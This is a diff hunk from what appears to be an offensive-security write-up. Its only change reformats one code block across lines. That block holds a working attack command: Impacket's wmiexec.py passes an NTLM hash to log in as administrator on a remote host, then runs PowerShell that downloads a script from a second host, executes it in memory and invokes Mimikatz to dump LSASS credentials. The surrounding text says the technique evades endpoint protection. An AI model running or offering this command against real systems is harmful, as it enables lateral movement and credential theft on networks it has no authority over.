@@ -58,7 +58,9 @@ LSASS creds with Mimikatz via Impacket's `wmiexec.py`, tricking many
 endpoint protection tools:
 
 ```
-wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:deadbeef0000000000000000deadbeef ./administrator@10.0.1.4  'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz "'
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:deadbeef0000000000000000deadbeef \
+    ./administrator@10.0.1.4  \
+    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/ps\"); Load-Hubmodule 11 ; Invoke-Mimikatz "'
 ```
 
 Author
